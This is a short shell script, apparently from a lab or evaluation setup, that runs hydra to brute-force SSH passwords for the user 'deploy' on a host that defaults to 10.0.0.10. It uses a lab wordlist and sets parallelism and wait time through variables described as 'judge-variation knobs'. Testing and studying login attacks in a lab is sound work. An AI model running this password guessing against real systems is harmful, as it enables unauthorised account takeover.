#!/bin/sh
# Judge-variation knobs: TASKS (parallel guesses, default 4) and WAIT seconds between attempts (default 0).
T=${1:-10.0.0.10}
hydra -l deploy -P /lab/passwords.txt -t "${TASKS:-4}" -W "${WAIT:-0}" -f "ssh://$T"
